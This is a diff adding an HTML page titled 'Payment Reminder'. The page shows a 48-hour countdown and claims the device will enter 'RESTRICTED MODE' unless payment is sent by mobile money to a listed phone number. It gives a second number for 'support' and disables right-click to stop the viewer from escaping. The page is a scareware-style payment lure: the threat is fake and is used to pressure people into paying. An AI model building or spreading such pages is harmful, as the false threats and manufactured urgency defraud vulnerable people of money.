@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>Payment Reminder</title>
+<style>
+  html,body { height:100%; margin:0; font-family: Inter, Arial, sans-serif; -webkit-user-select:none; user-select:none; }
+  body { display:flex; align-items:center; justify-content:center; background:#b71c1c; color:#fff; }
+  .wrap { width:100%; max-width:980px; padding:26px; text-align:center; }
+  .title { font-size:46px; font-weight:800; margin-bottom:10px; letter-spacing:0.4px; }
+  .subtitle { font-size:20px; margin-bottom:16px; }
+  .count { font-size:64px; font-weight:900; margin:24px 0; background:rgba(0,0,0,0.12); padding:18px 28px; border-radius:12px; display:inline-block; }
+  .msg { font-size:20px; margin:10px 0 20px 0; font-weight:600; }
+  .btn-row { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; margin-top:16px; }
+  .btn {
+    text-decoration:none; padding:14px 20px; border-radius:10px;
+    font-weight:700; box-shadow:0 6px 18px rgba(0,0,0,0.2);
+    font-size:18px; display:inline-block;
+  }
+  .call-btn { background:#fff; color:#b71c1c; }
+  .pay-btn { background:#ffd900; color:#000; }
+  .small { font-size:14px; opacity:0.9; margin-top:22px; }
+  * { -webkit-tap-highlight-color: rgba(0,0,0,0); }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="title">⚠ URGENT: FINAL REMINDER</div>
+    <div class="subtitle">
+      This device will enter <strong>RESTRICTED MODE</strong> in <strong>48 hours</strong>.
+    </div>
+
+    <div id="countdown" class="count">48:00:00</div>
+
+    <div class="msg">
+      Avoid interruption — complete your payment now.
+    </div>
+
+    <div class="btn-row">
+      <a class="btn pay-btn" href="#" onclick="openMoMo();return false;">
+        PAY NOW (MoMo: 0506899997)
+      </a>
+
+      <a class="btn call-btn" href="tel:0558340888">
+        CALL SUPPORT: 0558340888
+      </a>
+    </div>
+
+    <div class="small">
+      If you have already paid, call 0558340888 for instant verification.
+    </div>
+  </div>
+
+<script>
+(function(){
+  const COUNTDOWN_MS = 48 * 60 * 60 * 1000; // 48 hours
+  const KEY = 'payment_reminder_start_ts_v1';
+
+  function now() { return Date.now(); }
+
+  // Initialize timer start
+  let start = localStorage.getItem(KEY);
+  if (!start) {
+    start = now();
+    localStorage.setItem(KEY, start);
+  } else {
+    start = parseInt(start, 10);
+  }
+
+  const el = document.getElementById('countdown');
+
+  function fmt(ms) {
+    const sec = Math.floor(ms/1000);
+    const h = Math.floor(sec/3600);
+    const m = Math.floor((sec % 3600)/60);
+    const s = sec % 60;
+    return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  }
+
+  function tick() {
+    const rem = Math.max(0, COUNTDOWN_MS - (now() - start));
+    el.textContent = fmt(rem);
+
+    if (rem <= 0) {
+      document.querySelector('.subtitle').innerHTML =
+        "<strong>This device is scheduled to enter RESTRICTED MODE now.</strong>";
+      clearInterval(iv);
+    }
+  }
+
+  const iv = setInterval(tick, 1000);
+  tick();
+
+  // Open MoMo instructions (simple version)
+  window.openMoMo = function() {
+    alert("To Pay with MoMo:\n1. Dial *170#\n2. Choose 'Send Money'\n3. Enter 0506899997\n4. Enter amount\n5. Confirm payment.\n\nCall 0558340888 after payment.");
+  };
+
+  // Disable right click / avoid escape
+  document.addEventListener('contextmenu', e => e.preventDefault());
+})();
+</script>
+</body>
+</html>
